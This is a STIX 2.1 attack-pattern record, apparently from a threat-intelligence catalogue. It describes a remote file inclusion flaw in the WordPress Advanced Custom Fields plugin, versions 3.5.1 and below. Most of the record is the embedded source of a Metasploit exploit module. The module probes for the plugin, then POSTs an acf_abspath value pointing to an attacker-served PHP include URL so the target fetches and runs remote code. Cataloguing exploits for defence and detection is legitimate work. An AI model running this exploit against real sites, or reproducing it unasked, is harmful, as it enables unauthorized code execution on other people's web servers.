{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b82f2366-d4df-48cf-a2b4-547299eb07ea",
    "created": "2024-08-14T17:13:34.231389Z",
    "modified": "2024-08-14T17:13:34.231393Z",
    "name": "WordPress Plugin Advanced Custom Fields Remote File Inclusion",
    "description": " This module exploits a remote file inclusion flaw in the WordPress blogging software plugin known as Advanced Custom Fields. The vulnerability allows for remote file inclusion and remote code execution via the export.php script. The Advanced Custom Fields plug-in versions 3.5.1 and below are vulnerable. This exploit only works when the php option allow_url_include is set to On (Default Off). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_advanced_custom_fields_exec.rb",
            "external_id": "wp_advanced_custom_fields_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20121223025326/http://secunia.com:80/advisories/51037"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6103"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::PHPInclude\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress Plugin Advanced Custom Fields Remote File Inclusion',\n      'Description'    => %q{\n          This module exploits a remote file inclusion flaw in the WordPress blogging\n        software plugin known as Advanced Custom Fields. The vulnerability allows for remote\n        file inclusion and remote code execution via the export.php script. The Advanced\n        Custom Fields plug-in versions 3.5.1 and below are vulnerable. This exploit only\n        works when the php option allow_url_include is set to On (Default Off).\n      },\n      'Author'         =>\n        [\n          'Charlie Eriksen <charlie[at]ceriksen.com>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '87353'],\n          ['URL', 'http://web.archive.org/web/20121223025326/http://secunia.com:80/advisories/51037'],\n          ['WPVDB', '6103']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find'\n            }\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2012-11-14',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The full URI path to WordPress', '/']),\n        OptString.new('PLUGINSPATH', [true, 'The relative path to the plugins folder', 'wp-content/plugins/'])\n      ])\n  end\n\n  def check\n    uri = target_uri.path\n    uri << '/' if uri[-1,1] != '/'\n    uri << datastore['PLUGINSPATH']\n    uri << '/' if uri[-1,1] != '/'\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => \"#{uri}advanced-custom-fields/core/api.php\"\n    })\n\n    if res and res.code == 200\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def php_exploit\n    uri = target_uri.path\n    uri << '/' if uri[-1,1] != '/'\n    uri << datastore['PLUGINSPATH']\n    uri << '/' if uri[-1,1] != '/'\n\n    print_status('Sending request')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => \"#{uri}advanced-custom-fields/core/actions/export.php\",\n      'data'   => \"acf_abspath=#{php_include_url}\"\n    })\n\n    if res and res.body =~ /allow_url_include/\n      fail_with(Failure::NotVulnerable, 'allow_url_include is disabled')\n    elsif res.code != 200\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply - #{res.code}\")\n    end\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-11-14",
    "x_mitre_platforms": [
        "php'"
    ]
}